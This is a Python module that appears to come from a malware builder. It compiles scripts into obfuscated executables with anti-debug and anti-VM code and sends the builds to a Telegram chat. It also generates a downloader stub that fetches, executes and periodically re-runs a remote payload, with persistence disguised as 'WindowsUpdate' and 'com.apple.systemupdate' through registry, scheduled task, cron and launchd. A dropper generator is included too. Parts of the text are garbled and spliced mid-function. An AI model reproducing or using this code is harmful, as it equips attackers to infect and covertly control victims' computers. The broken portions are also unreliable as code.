#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
compiler.py - EXE/PyInstaller compilation and obfuscation module
"""

import os
import sys
import subprocess
import shutil
import tempfile
import hashlib
import base64
import json
import zipfile
import tarfile
import time
import threading
from typing import Dict, List, Optional, Tuple, Any, Union
from pathlib import Path
from datetime import datetime

# Import logger
from ..utils.logger import get_logger
from ..utils.obfuscation import get_obfuscation_manager
from ..utils.encryption import get_encryption_manager

logger = get_logger()

class Compiler:
    """Compiles Python scripts to executables with obfuscation and anti-analysis"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # Obfuscation and encryption managers
        self.obfuscator = get_obfuscation_manager(config)
        self.encryptor = get_encryption_manager(config)
        
        # Telegram bot for notifications
        self.telegram_bot = None
        self.setup_telegram()
        
        # Compilation tools
        self.pyinstaller_path = self._find_pyinstaller()
        self.nuitka_path = self._find_nuitka()
        self.cx_freeze_path = self._find_cx_freeze()
        
        # Output directories
        self.build_dir = self.config.get('build_dir', 'build')
        self.dist_dir = self.config.get('dist_dir', 'dist')
        
        # Create directories
        os.makedirs(self.build_dir, exist_ok=True)
        os.makedirs(self.dist_dir, exist_ok=True)
        
        logger.info("Compiler initialized", module="compiler")
    
    def setup_telegram(self):
        """Setup Telegram bot for notifications"""
        telegram_config = self.config.get('telegram', {})
        bot_token = telegram_config.get('bot_token')
        chat_id = telegram_config.get('compiler_chat_id')
        
        if bot_token and chat_id:
            try:
                from telegram import Bot
                self.telegram_bot = Bot(token=bot_token)
                self.compiler_chat_id = chat_id
                logger.info("Telegram compiler bot initialized", module="compiler")
            except ImportError:
                logger.warning("Telegram module not available", module="compiler")
            except Exception as e:
                logger.error(f"Error setting up Telegram: {e}", module="compiler")
    
    def send_telegram_notification(self, title: str, message: str, 
                                 file_path: str = None):
        """Send compilation notification to Telegram"""
        if not self.telegram_bot or not hasattr(self, 'compiler_chat_id'):
            return
        
        try:
            full_message = fb>🔧 {b>\n\n{message}"
            
            if file_path and os.path.exists(file_path):
                file_size = os.path.getsize(file_path)
                
                # Check file size (Telegram has 50MB limit)
                if file_size50 * 1024 * 1024:  # 50 MB
                    with open(file_path, 'rb') as f:
                        self.telegram_bot.send_document(
                            chat_id=self.compiler_chat_id,
                            document=f,
                            caption=full_message,
                            parse_mode='HTML'
                        )
                    logger.debug(f"Compiled file sent via Telegram: {file_path} ({file_size} bytes)", module="compiler")
                else:
                    self.telegram_bot.send_message(
                        chat_id=self.compiler_chat_id,
                        text=full_message + f"\n\nFile too large for Telegram: {file_size/(1024*1024):.1f} MB",
                        parse_mode='HTML'
                    )
            else:
                self.telegram_bot.send_message(
                    chat_id=self.compiler_chat_id,
                    text=full_message,
                    parse_mode='HTML'
                )
                
        except Exception as e:
            logger.error(f"Error sending Telegram notification: {e}", module="compiler")
    
    def _find_pyinstaller(self) -> Optional[str]:
        """Find PyInstaller executable"""
        pyinstaller_paths = [
            'pyinstaller',
            'pyinstaller.exe',
            sys.executable.replace('python', 'pyinstaller'),
            os.path.join(os.path.dirname(sys.executable), 'pyinstaller'),
            os.path.join(os.path.dirname(sys.executable), 'Scripts', 'pyinstaller.exe')
        ]
        
        for path in pyinstaller_paths:
            try:
                result = subprocess.run(
                    [path, '--version'],
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0:
                    return path
            except:
                continue
        
        # Try pip install
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'], 
                          capture_output=True)
            return 'pyinstaller'
        except:
            return None
    
    def _find_nuitka(self) -> Optional[str]:
        """Find Nuitka executable"""
        nuitka_paths = [
            'nuitka',
            'nuitka.exe',
            sys.executable.replace('python', 'nuitka'),
            os.path.join(os.path.dirname(sys.executable), 'nuitka'),
            os.path.join(os.path.dirname(sys.executable), 'Scripts', 'nuitka.exe')
        ]
        
        for path in nuitka_paths:
            try:
                result = subprocess.run(
                    [path, '--version'],
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0:
                    return path
            except:
                continue
        
        return None
    
    def _find_cx_freeze(self) -> Optional[str]:
        """Find cx_Freeze executable"""
        cxfreeze_paths = [
            'cxfreeze',
            'cxfreeze.exe',
            sys.executable.replace('python', 'cxfreeze'),
            os.path.join(os.path.dirname(sys.executable), 'cxfreeze'),
            os.path.join(os.path.dirname(sys.executable), 'Scripts', 'cxfreeze.exe')
        ]
        
        for path in cxfreeze_paths:
            try:
                result = subprocess.run(
                    [path, '--version'],
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0:
                    return path
            except:
                continue
        
        return None
    
    def compile_with_pyinstaller(self, script_path: str, output_name: str = None,
                                onefile: bool = True, windowed: bool = False,
                                icon: str = None, upx: bool = True,
                                obfuscate: bool = True, encrypt: bool = False,
                                anti_debug: bool = True, anti_vm: bool = True) -> Optional[str]:
        """Compile script using PyInstaller"""
        try:
            if not os.path.exists(script_path):
                logger.error(f"Script not found: {script_path}", module="compiler")
                return None
            
            if not self.pyinstaller_path:
                logger.error("PyInstaller not found", module="compiler")
                return None
            
            # Generate output name if not provided
            if output_name is None:
                output_name = os.path.splitext(os.path.basename(script_path))[0]
            
            # Create temporary directory for processing
            with tempfile.TemporaryDirectory() as tmp_dir:
                processed_script = os.path.join(tmp_dir, 'processed_script.py')
                
                # Read original script
                with open(script_path, 'r', encoding='utf-8') as f:
                    script_content = f.read()
                
                # Apply obfuscation
                if obfuscate:
                    script_content = self.obfuscator.obfuscate_code(script_content)
                
                # Add anti-debug and anti-VM code
                if anti_debug or anti_vm:
                    script_content = self._add_protection_code(script_content, anti_debug, anti_vm)
                
                # Write processed script
                with open(processed_script, 'w', encoding='utf-8') as f:
                    f.write(script_content)
                
                # Build PyInstaller command
                cmd = [self.pyinstaller_path]
                
                # Basic options
                if onefile:
                    cmd.append('--onefile')
                
                if windowed:
                    cmd.append('--windowed')
                else:
                    cmd.append('--console')
                
                if icon and os.path.exists(icon):
                    cmd.extend(['--icon', icon])
                
                if upx:
                    cmd.append('--upx-dir=upx' if os.path.exists('upx') else '--upx-exclude=vcruntime140.dll')
                
                # Advanced options for stealth
                cmd.extend([
                    '--clean',
                    '--noconfirm',
                    '--distpath', self.dist_dir,
                    '--workpath', os.path.join(self.build_dir, 'pyinstaller'),
                    '--specpath', self.build_dir,
                    '--name', output_name,
                    '--add-data', f'{processed_script};.',
                    '--hidden-import', 'telegram',
                    '--hidden-import', 'psutil',
                    '--hidden-import', 'pynput',
                    '--hidden-import', 'pyautogui',
                    '--hidden-import', 'cryptography',
                    '--hidden-import', 'requests',
                    '--hidden-import', 'pillow',
                    '--exclude-module', 'tkinter',
                    '--exclude-module', 'test',
                    '--exclude-module', 'unittest'
                ])
                
                # Add the script
                cmd.append(processed_script)
                
                logger.info(f"Compiling with PyInstaller: {output_name}", module="compiler")
                
                # Run PyInstaller
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=300  # 5 minutes timeout
                )
                
                if result.returncode != 0:
                    logger.error(f"PyInstaller compilation failed: {result.stderr}", module="compiler")
                    return None
                
                # Determine output path
                if sys.platform == 'win32':
                    ext = '.exe'
                elif sys.platform == 'darwin':
                    ext = ''
                else:
                    ext = ''
                
                output_path = os.path.join(self.dist_dir, output_name + ext)
                
                if onefile:
                    output_path = os.path.join(self.dist_dir, output_name + ext)
                else:
                    output_path = os.path.join(self.dist_dir, output_name)
                
                # Apply encryption if requested
                if encrypt and os.path.exists(output_path):
                    encrypted_path = output_path + '.enc'
                    self.encryptor.encrypt_file(output_path, encrypted_path)
                    
                    # Remove original
                    os.remove(output_path)
                    output_path = encrypted_path
                
                # Calculate hash and size
                file_size = os.path.getsize(output_path)
                with open(output_path, 'rb') as f:
                    file_hash = hashlib.sha256(f.read()).hexdigest()
                
                # Send Telegram notification
                self.send_telegram_notification(
                    "PyInstaller Compilation Complete",
                    f"Script: {os.path.basename(script_path)}\n"
                    f"Output: {os.path.basename(output_path)}\n"
                    f"Size: {file_size/(1024*1024):.2f} MB\n"
                    f"Hash: {file_hash[:16]}...\n"
                    f"OneFile: {onefile}\n"
                    f"Obfuscated: {obfuscate}\n"
                    f"Encrypted: {encrypt}",
                    output_path
                )
                
                logger.info(f"Compilation successful: {output_path} ({file_size} bytes)", module="compiler")
                return output_path
            
        except Exception as e:
            logger.error(f"PyInstaller compilation error: {e}", module="compiler")
            return None
    
    def compile_with_nuitka(self, script_path: str, output_name: str = None,
                           standalone: bool = True, show_progress: bool = False,
                           obfuscate: bool = True, lto: bool = True) -> Optional[str]:
        """Compile script using Nuitka"""
        try:
            if not os.path.exists(script_path):
                logger.error(f"Script not found: {script_path}", module="compiler")
                return None
            
            if not self.nuitka_path:
                logger.error("Nuitka not found", module="compiler")
                return None
            
            # Generate output name if not provided
            if output_name is None:
                output_name = os.path.splitext(os.path.basename(script_path))[0]
            
            # Create temporary directory for processing
            with tempfile.TemporaryDirectory() as tmp_dir:
                processed_script = os.path.join(tmp_dir, 'processed_script.py')
                
                # Read original script
                with open(script_path, 'r', encoding='utf-8') as f:
                    script_content = f.read()
                
                # Apply obfuscation
                if obfuscate:
                    script_content = self.obfuscator.obfuscate_code(script_content)
                
                # Write processed script
                with open(processed_script, 'w', encoding='utf-8') as f:
                    f.write(script_content)
                
                # Build Nuitka command
                cmd = [self.nuitka_path]
                
                # Basic options
                if standalone:
                    cmd.append('--standalone')
                
                if show_progress:
                    cmd.append('--show-progress')
                
                if lto:
                    cmd.append('--lto')
                
                # Advanced options
                cmd.extend([
                    '--follow-imports',
                    '--plugin-enable=pylint-warnings',
                    '--output-dir=' + self.dist_dir,
                    '--output-filename=' + output_name,
                    '--remove-output',
                    '--assume-yes-for-downloads'
                ])
                
                # Platform-specific options
                if sys.platform == 'win32':
                    cmd.extend([
                        '--mingw64',
                        '--windows-console-mode=disable'
                    ])
                elif sys.platform == 'darwin':
                    cmd.extend([
                        '--clang',
                        '--macos-create-app-bundle'
                    ])
                
                # Add the script
                cmd.append(processed_script)
                
                logger.info(f"Compiling with Nuitka: {output_name}", module="compiler")
                
                # Run Nuitka
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=600  # 10 minutes timeout for Nuitka
                )
                
                if result.returncode != 0:
                    logger.error(f"Nuitka compilation failed: {result.stderr}", module="compiler")
                    return None
                
                # Determine output path
                if sys.platform == 'win32':
                    output_path = os.path.join(self.dist_dir, output_name + '.exe')
                elif sys.platform == 'darwin':
                    output_path = os.path.join(self.dist_dir, output_name + '.app')
                else:
                    output_path = os.path.join(self.dist_dir, output_name)
                
                # Calculate hash and size
                file_size = os.path.getsize(output_path) if os.path.exists(output_path) else 0
                file_hash = ''
                
                if os.path.exists(output_path):
                    with open(output_path, 'rb') as f:
                        file_hash = hashlib.sha256(f.read()).hexdigest()
                
                # Send Telegram notification
                self.send_telegram_notification(
                    "Nuitka Compilation Complete",
                    f"Script: {os.path.basename(script_path)}\n"
                    f"Output: {os.path.basename(output_path)}\n"
                    f"Size: {file_size/(1024*1024):.2f} MB\n"
                    f"Hash: {file_hash[:16] if file_hash else 'N/A'}...\n"
                    f"Standalone: {standalone}\n"
                    f"Obfuscated: {obfuscate}\n"
                    f"LTO: {lto}",
                    output_path if os.path.exists(output_path) else None
                )
                
                logger.info(f"Nuitka compilation successful: {output_path}", module="compiler")
                return output_path
            
        except Exception as e:
            logger.error(f"Nuitka compilation error: {e}", module="compiler")
            return None
    
    def compile_with_cx_freeze(self, script_path: str, output_name: str = None,
                              base: str = None, icon: str = None,
                              obfuscate: bool = True) -> Optional[str]:
        """Compile script using cx_Freeze"""
        try:
            if not os.path.exists(script_path):
                logger.error(f"Script not found: {script_path}", module="compiler")
                return None
            
            if not self.cx_freeze_path:
                logger.error("cx_Freeze not found", module="compiler")
                return None
            
            # Generate output name if not provided
            if output_name is None:
                output_name = os.path.splitext(os.path.basename(script_path))[0]
            
            # Create temporary directory for processing
            with tempfile.TemporaryDirectory() as tmp_dir:
                processed_script = os.path.join(tmp_dir, 'processed_script.py')
                
                # Read original script
                with open(script_path, 'r', encoding='utf-8') as f:
                    script_content = f.read()
                
                # Apply obfuscation
                if obfuscate:
                    script_content = self.obfuscator.obfuscate_code(script_content)
                
                # Write processed script
                with open(processed_script, 'w', encoding='utf-8') as f:
                    f.write(script_content)
                
                # Create setup.py for cx_Freeze
                setup_content = f"""
from cx_Freeze import setup, Executable
import sys

base = None
if sys.platform == "win32":
    base = "{base if base else "Win32GUI" if not sys.stdout.isatty() else "Console"}"

executables = [
    Executable(
        "{processed_script}",
        base=base,
        target_name="{output_name}",
        icon="{icon if icon and os.path.exists(icon) else ""}"
    )
]

setup(
    name="{output_name}",
    version="1.0",
    description="System Application",
    executables=executables,
    options={{"build_exe": {{
        "build_exe": "{os.path.join(self.dist_dir, output_name)}",
        "packages": ["os", "sys", "json", "hashlib", "base64", "threading", "time"],
        "excludes": ["tkinter", "test", "unittest"],
        "include_files": [],
        "zip_include_packages": ["*"],
        "zip_exclude_packages": [],
        "optimize": 2
    }}}}
)
"""
                
                setup_path = os.path.join(tmp_dir, 'setup.py')
                with open(setup_path, 'w', encoding='utf-8') as f:
                    f.write(setup_content)
                
                logger.info(f"Compiling with cx_Freeze: {output_name}", module="compiler")
                
                # Run cx_Freeze
                cmd = [sys.executable, setup_path, 'build']
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    cwd=tmp_dir,
                    timeout=300
                )
                
                if result.returncode != 0:
                    logger.error(f"cx_Freeze compilation failed: {result.stderr}", module="compiler")
                    return None
                
                # Determine output path
                build_dir = os.path.join(tmp_dir, 'build')
                if os.path.exists(build_dir):
                    # Find the executable
                    for root, dirs, files in os.walk(build_dir):
                        for file in files:
                            if file.startswith(output_name) and (file.endswith('.exe') or '.' not in file):
                                exe_path = os.path.join(root, file)
                                
                                # Copy to dist directory
                                shutil.copy2(exe_path, self.dist_dir)
                                output_path = os.path.join(self.dist_dir, file)
                                
                                # Calculate hash and size
                                file_size = os.path.getsize(output_path)
                                with open(output_path, 'rb') as f:
                                    file_hash = hashlib.sha256(f.read()).hexdigest()
                                
                                # Send Telegram notification
                                self.send_telegram_notification(
                                    "cx_Freeze Compilation Complete",
                                    f"Script: {os.path.basename(script_path)}\n"
                                    f"Output: {os.path.basename(output_path)}\n"
                                    f"Size: {file_size/(1024*1024):.2f} MB\n"
                                    f"Hash: {file_hash[:16]}...\n"
                                    f"Base: {base}\n"
                                    f"Obfuscated: {obfuscate}",
                                    output_path
                                )
                                
                                logger.info(f"cx_Freeze compilation successful: {output_path}", module="compiler")
                                return output_path
            
            return None
            
        except Exception as e:
            logger.error(f"cx_Freeze compilation error: {e}", module="compiler")
            return None
    
    def _add_protection_code(self, script_content: str, anti_debug: bool, anti_vm: bool) -> str:
        """Add anti-debug and anti                
                # Load DLL into memory
                kernel32 = ctypes.windll.kernel32
                dll_handle = kernel32.LoadLibraryW(temp_file.name)
                
                if dll_handle:
                    return True
            
            return False
            
    except Exception as e:
        print(f"Execution error: {{e}}")
        return False

def establish_persistence():
    \"\"\"Establish persistence based on platform\"\"\"
    platform_methods = CONFIG.get("persistence", {{}})
    
    try:
        if sys.platform == 'win32':
            methods = platform_methods.get('windows', ['registry'])
            
            for method in methods:
                try:
                    if method == 'registry':
                        import winreg
                        
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                            0, winreg.KEY_WRITE)
                        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
                        winreg.CloseKey(key)
                        
                    elif method == 'scheduled_task':
                        import subprocess
                        subprocess.run(['schtasks', '/Create', '/TN', 'WindowsUpdate', 
                                      '/TR', sys.executable, '/SC', 'ONLOGON', '/F'], 
                                     capture_output=True)
                    
                except:
                    continue
        
        elif sys.platform == 'linux':
            methods = platform_methods.get('linux', ['cron'])
            
            for method in methods:
                try:
                    if method == 'cron':
                        cron_line = f"* * * * * {{sys.executable}} >/dev/null 2>&1\\n"
                        
                        result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                        current_cron = result.stdout if result.returncode == 0 else ""
                        
                        new_cron = current_cron + cron_line
                        
                        with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp:
                            tmp.write(new_cron)
                            tmp_path = tmp.name
                        
                        subprocess.run(['crontab', tmp_path])
                        os.remove(tmp_path)
                    
                except:
                    continue
        
        elif sys.platform == 'darwin':
            methods = platform_methods.get('macos', ['launchd'])
            
            for method in methods:
                try:
                    if method == 'launchd':
                        import plistlib
                        
                        plist_content = {{
                            'Label': 'com.apple.systemupdate',
                            'ProgramArguments': [sys.executable],
                            'RunAtLoad': True,
                            'KeepAlive': True
                        }}
                        
                        plist_path = os.path.expanduser('~/Library/LaunchAgents/com.apple.systemupdate.plist')
                        with open(plist_path, 'wb') as f:
                            plistlib.dump(plist_content, f)
                        
                        subprocess.run(['launchctl', 'load', plist_path])
                    
                except:
                    continue
    
    except Exception as e:
        print(f"Persistence error: {{e}}")

def main():
    \"\"\"Main stub execution\"\"\"
    print("Stub payload starting...")
    
    # Download main payload
    print(f"Downloading from: {{CONFIG['download_url']}}")
    payload_data = download_payload(CONFIG['download_url'])
    
    if not payload_data:
        print("Failed to download payload")
        return
    
    # Verify payload
    print("Verifying payload...")
    if not verify_payload(payload_data, CONFIG['payload_hash']):
        print("Payload verification failed")
        return
    
    print("Payload verified successfully")
    
    # Execute payload
    print(f"Executing payload with method: {{CONFIG['execution_method']}}")
    success = execute_payload(payload_data, CONFIG['execution_method'])
    
    if success:
        print("Payload executed successfully")
        
        # Establish persistence if configured
        if CONFIG['persistence']:
            print("Establishing persistence...")
            establish_persistence()
        
        # Keep stub running to check for updates
        check_interval = CONFIG.get('check_interval', 3600)
        print(f"Stub will check for updates every {{check_interval}} seconds")
        
        while True:
            time.sleep(check_interval)
            
            # Check for updated payload
            new_payload = download_payload(CONFIG['download_url'])
            if new_payload and verify_payload(new_payload, CONFIG['payload_hash']):
                print("New payload available, executing...")
                execute_payload(new_payload, CONFIG['execution_method'])
    
    else:
        print("Payload execution failed")

if __name__ == "__main__":
    main()
"""
            
            # Fill template with config values
            stub_code = stub_template.format(
                download_url=config.get('download_url', 'http://example.com/payload'),
                payload_hash=config.get('payload_hash', ''),
                execution_method=config.get('execution_method', 'direct'),
                persistence=json.dumps(config.get('persistence', {})),
                check_interval=config.get('check_interval', 3600)
            )
            
            # Save stub to file
            stub_name = config.get('stub_name', 'stub_payload')
            stub_path = os.path.join(self.dist_dir, f"{stub_name}.py")
            
            with open(stub_path, 'w', encoding='utf-8') as f:
                f.write(stub_code)
            
            logger.info(f"Stub payload created: {stub_path}", module="compiler")
            
            # Compile stub if requested
            if config.get('compile_stub', True):
                compiled_stub = self.compile_with_pyinstaller(
                    stub_path,
                    output_name=stub_name,
                    onefile=True,
                    obfuscate=True,
                    anti_debug=True,
                    anti_vm=True
                )
                
                if compiled_stub:
                    # Remove Python source file
                    os.remove(stub_path)
                    return compiled_stub
            
            return stub_path
            
        except Exception as e:
            logger.error(f"Stub payload creation error: {e}", module="compiler")
            return None
    
    def create_dropper(self, payload_path: str, output_name: str = None,
                      compression: str = 'zip', password: str = None) -> str:
        """Create a dropper that extracts and executes payload"""
        try:
            if not os.path.exists(payload_path):
                logger.error(f"Payload not found: {payload_path}", module="compiler")
                return None
            
            if output_name is None:
                output_name = os.path.splitext(os.path.basename(payload_path))[0] + '_dropper'
            
            # Read payload
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
            
            # Create dropper template
            dropper_template = """#!/usr/bin/env python3
# -*- coding: utf-8 -*-
Dropper - Extracts and executes embedded payload
"""

import os
import sys
import tempfile
import base64
import zlib
import subprocess
import hashlib

# Embedded payload (compressed and encoded)
EMBEDDED_PAYLOADTotal scripts: {results['total']}\n"
                f"Successful: {results['successful']}\n"
                f"Failed: {results['failed']}\n"
                f"Success rate: {(results['successful']/results['total']*100):.1f}%"
            )
            
            logger.info(f"Batch compilation completed: {results['successful']}/{results['total']} successful", module="compiler")
            return results
            
        except Exception as e:
            logger.error(f"Batch compilation error: {e}", module="compiler")
            return {'error': str(e)}
    
    def get_tools_status(self) -> Dict[str, bool]:
        """Get status of compilation tools"""
        return {
            'pyinstaller': self.pyinstaller_path is not None,
            'nuitka': self.nuitka_path is not None,
            'cx_freeze': self.cx_freeze_path is not None,
            'telegram': self.telegram_bot is not None
        }
    
    def get_status(self) -> Dict[str, Any]:
        """Get compiler status"""
        tools_status = self.get_tools_status()
        
        return {
            'tools_available': sum(1 for v in tools_status.values() if v),
            **tools_status,
            'build_dir': self.build_dir,
            'dist_dir': self.dist_dir,
            'dist_files': len(os.listdir(self.dist_dir)) if os.path.exists(self.dist_dir) else 0
        }

# Global instance
_compiler = None

def get_compiler(config: Dict = None) -> Compiler:
    """Get or create compiler instance"""
    global _compiler
    
    if _compiler is None:
        _compiler = Compiler(config)
    
    return _compiler

if __name__ == "__main__":
    # Test the compiler
    config = {
        'telegram': {
            'bot_token': 'test_token',
            'compiler_chat_id': 123456789
        }
    }
    
    compiler = get_compiler(config)
    
    print("Testing compiler...")
    
    # Check tool availability
    tools_status = compiler.get_tools_status()
    print(f"PyInstaller available: {tools_status['pyinstaller']}")
    print(f"Nuitka available: {tools_status['nuitka']}")
    print(f"cx_Freeze available: {tools_status['cx_freeze']}")
    
    # Create test script
    test_script_content =f"""
#!/usr/bin/env python3
print("Hello from test script!")
"""
import time
time.sleep(1)
print("Test completed.")

    
    test_script_path = os.path.join(tempfile.gettempdir(), 'test_script.py')
    with open(test_script_path, 'w') as f:
        f.write(test_script_content)
    
    # Test PyInstaller compilation if available
    if tools_status['pyinstaller']:
        print("\nTesting PyInstaller compilation...")
        exe_path = compiler.compile_with_pyinstaller(
            test_script_path,
            output_name='test_app',
            onefile=True,
            obfuscate=False,
            anti_debug=False,
            anti_vm=False
        )
        
        if exe_path and os.path.exists(exe_path):
            print(f"PyInstaller compilation successful: {exe_path}")
            print(f"File size: {os.path.getsize(exe_path)/(1024*1024):.2f} MB")
            
            # Test execution (optional)
            # import subprocess
            # result = subprocess.run([exe_path], capture_output=True, text=True)
            # print(f"Execution output: {result.stdout}")
    
    # Test dropper creation
    print("\nTesting dropper creation...")
    
    # Create a simple payload for the dropper
    payload_content = b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x0E\x1F\xBA\x0E\x00\xB4\t\xCD!\xB8\x01L\xCD!This program cannot be run in DOS mode.\r\r\n$\x00\x00\x00\x00\x00\x00\x00'
    
    payload_path = os.path.join(tempfile.gettempdir(), 'test_payload.exe')
    with open(payload_path, 'wb') as f:
        f.write(payload_content)
    
    dropper_path = compiler.create_dropper(
        payload_path,
        output_name='test_dropper',
        compression='zip'
    )
    
    if dropper_path and os.path.exists(dropper_path):
        print(f"Dropper created: {dropper_path}")
    
    # Cleanup test files
    for file in [test_script_path, payload_path]:
        if os.path.exists(file):
            os.remove(file)
    
    # Show status
    status = compiler.get_status()
    print(f"\n🔧 Compiler Status: {status}")
    
    print("\n✅ Compiler tests completed!")
